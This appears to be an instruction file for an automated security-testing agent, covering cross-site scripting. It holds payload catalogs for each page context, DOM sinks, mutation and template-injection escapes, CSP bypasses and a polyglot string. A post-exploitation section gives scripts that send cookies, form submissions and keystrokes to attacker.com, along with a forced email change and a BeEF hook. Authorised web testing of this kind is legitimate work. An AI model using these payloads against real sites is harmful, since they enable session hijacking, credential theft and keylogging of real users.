@@ -1,0 +1,298 @@
+<xss_vulnerability_testing_guide>
+<title>CROSS-SITE SCRIPTING (XSS) VULNERABILITY TESTING</title>
+
+<critical>XSS remains highly prevalent due to context complexity, parser behavior differences, and framework-specific sinks. Treat every user-influenced string as untrusted until strictly encoded for the exact output context and protected by runtime policies (CSP/Trusted Types).</critical>
+
+<scope>
+- Reflected XSS (non-persistent, immediate execution)
+- Stored XSS (persistent, executed on page load)
+- DOM-based XSS (client-side manipulation)
+- Mutation XSS (mXSS - parser differential attacks)
+- Universal XSS (browser/framework vulnerabilities)
+- Multi-context XSS (HTML, JavaScript, CSS, URL contexts)
+</scope>
+
+<methodology>
+1. **Identify input points**: URL parameters, form fields, search boxes, file uploads, JSON APIs
+2. **Trace data flow**: Where does input appear in response? HTML body, attributes, JavaScript, CSS?
+3. **Determine context**: HTML element, attribute value, JavaScript string, URL, CSS property
+4. **Select appropriate payload**: Context-specific payload that breaks out and executes
+5. **Test execution**: Observe JavaScript execution (alert, console, network request)
+6. **Validate impact**: Demonstrate session theft, action hijacking, or data exfiltration
+</methodology>
+
+<context_detection>
+# HTML Element Context
+<div>USER_INPUT_HERE</div>
+Test: <script>alert(1)</script>
+
+# HTML Attribute Context
+<input value="USER_INPUT_HERE">
+Test: "><script>alert(1)</script>
+
+# JavaScript String Context
+<script>var x = "USER_INPUT_HERE";</script>
+Test: ";alert(1);//
+
+# JavaScript Template Literal
+<script>var x = `USER_INPUT_HERE`;</script>
+Test: {% raw %}${alert(1)}{% endraw %}
+
+# URL Context
+<a href="USER_INPUT_HERE">Link</a>
+Test: javascript:alert(1)
+
+# CSS Context
+<style>body { background: USER_INPUT_HERE; }</style>
+Test: red;}body{background:url('javascript:alert(1)')
+</context_detection>
+
+<payload_catalog>
+# Basic HTML context
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+
+# Attribute context (breaking out of quotes)
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<img src=x onload=alert(1)>
+<svg/onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+
+# JavaScript context breaks
+";alert(1);//
+';alert(1);//
+{% raw %}`${alert(1)}`{% endraw %}
+</script><script>alert(1)</script>
+
+# URL context
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:msgbox(1)
+
+# Markdown/Rich Text
+[Click](javascript:alert(1))
+![XSS](https://example.com/x.jpg" onerror="alert(1))
+</payload_catalog>
+
+<advanced_techniques>
+<dom_based_xss>
+# Sources (user input)
+- location.hash
+- location.search
+- document.referrer
+- postMessage events
+- localStorage/sessionStorage
+- document.cookie
+
+# Sinks (dangerous operations)
+- innerHTML / outerHTML
+- document.write() / document.writeln()
+- eval() / setTimeout() / setInterval() with string
+- element.setAttribute()
+- location.href / location.assign()
+
+# Example vulnerable pattern
+const params = new URLSearchParams(location.search);
+const name = params.get('name');
+document.getElementById('welcome').innerHTML = 'Hello ' + name;
+
+# Exploit
+?name=<img src=x onerror=alert(document.cookie)>
+</dom_based_xss>
+
+<mutation_xss>
+# Browser parser mutations that bypass sanitizers
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<form><button formaction=javascript:alert(1)>Click
+<svg><style><img src=x onerror=alert(1)></style>
+</mutation_xss>
+
+<template_injection>
+# AngularJS (legacy)
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# Vue.js
+{{_c.constructor('alert(1)')()}}
+
+# Handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "alert(1)"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+</template_injection>
+
+<csp_bypass>
+# Weak CSP policies
+script-src 'unsafe-inline'          # Allows inline scripts
+script-src data:                    # Allows data: URIs
+script-src 'unsafe-eval'            # Allows eval()
+script-src *                        # Allows any origin
+
+# JSONP endpoints for CSP bypass
+<script src="https://trusted-site.com/jsonp?callback=alert"></script>
+
+# Script gadgets (libraries with dangerous functions)
+<script src="https://trusted-cdn.com/jquery.js"></script>
+<div id="xss" data-callback="alert">Click me</div>
+
+# Base tag injection
+<base href="https://attacker.com/">
+<script src="/assets/app.js"></script>  # Loads from attacker domain
+</csp_bypass>
+
+<polyglot_payloads>
+# Works in multiple contexts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# SVG polyglot
+<svg/onload=alert(1)>
+
+# HTML + Attribute polyglot
+"><img src=x onerror=alert(1)>
+</polyglot_payloads>
+</advanced_techniques>
+
+<framework_specific>
+<react>
+# Primary sink
+dangerouslySetInnerHTML={{__html: userInput}}
+
+# Bypass attempts
+- {% raw %}href={`javascript:${userInput}`}{% endraw %}
+- Custom components that use innerHTML internally
+
+# Safe patterns
+- JSX automatically escapes
+- Use textContent instead of innerHTML
+- Sanitize with DOMPurify before dangerouslySetInnerHTML
+</react>
+
+<vue>
+# Dangerous directive
+<div v-html="userInput"></div>
+
+# Safe patterns
+- Use {{userInput}} for text (auto-escaped)
+- Sanitize before v-html
+- Avoid dynamic attribute bindings from user input
+</vue>
+
+<angular>
+# Legacy AngularJS
+- Expression injection: {{userInput}}
+- Sandbox bypass: Use constructor access
+
+# Modern Angular
+- [innerHTML]="userInput" is dangerous
+- Use Angular's DomSanitizer
+- Sanitization bypass is a vuln
+</angular>
+</framework_specific>
+
+<post_exploitation>
+# Session token theft
+<script>
+fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
+
+# Form hijacking
+<script>
+document.querySelector('form').onsubmit = function(e) {
+  e.preventDefault();
+  fetch('https://attacker.com/phish', {
+    method: 'POST',
+    body: new FormData(this)
+  });
+}
+</script>
+
+# Keylogging
+<script>
+document.addEventListener('keypress', function(e) {
+  fetch('https://attacker.com/keys?k=' + e.key);
+});
+</script>
+
+# CSRF via XSS
+<script>
+fetch('/api/change-email', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+</script>
+
+# BeEF hook (for demonstrations only)
+<script src="https://attacker.com/hook.js"></script>
+</post_exploitation>
+
+<validation_requirements>
+Provide complete proof-of-concept including:
+1. **Injection point**: Exact parameter, header, or input field
+2. **Context**: Where payload appears (HTML element, attribute, JavaScript, etc.)
+3. **Payload**: Minimal payload that demonstrates execution
+4. **Execution proof**: Screenshot or HTTP response showing alert/console output
+5. **Impact**: What attacker can do (steal cookies, perform actions, deface page)
+6. **Reproduction**: Full HTTP request or steps to reproduce
+7. **Remediation**: Context-appropriate encoding or Content Security Policy
+</validation_requirements>
+
+<false_positives_to_avoid>
+- Input properly encoded for context (HTML entities, JavaScript escaping)
+- CSP with nonces/hashes blocking inline scripts
+- Trusted Types enforcing typed sinks
+- Sanitizers (DOMPurify) with strict configuration
+- Framework auto-escaping working correctly
+- WAF blocking payloads before reaching application
+</false_positives_to_avoid>
+
+<pro_tips>
+1. **Context is everything**: Same payload won't work in all contexts
+2. **Start simple**: <script>alert(1)</script> then iterate
+3. **Use alert(document.domain)**: Proves same-origin execution
+4. **Test all input vectors**: URL, forms, JSON, headers, file names
+5. **Check stored locations**: Comments, profiles, messages, file metadata
+6. **Look for DOM sinks**: innerHTML, document.write, eval
+7. **Test with CSP**: See if inline scripts are blocked
+8. **Try encoding**: URL encoding, HTML entities, Unicode
+9. **Use developer tools**: Inspect where input appears in DOM
+10. **Demonstrate impact**: Cookie theft > simple alert()
+</pro_tips>
+
+<remember>
+XSS can completely compromise user accounts. Always:
+- Use minimal, safe payloads (alert(document.domain))
+- Never steal real session tokens in testing
+- Document exact reproduction steps
+- Recommend context-appropriate encoding + CSP as fixes
+- Test both reflected and stored vectors
+- Consider DOM-based XSS in client-side frameworks
+</remember>
+</xss_vulnerability_testing_guide>
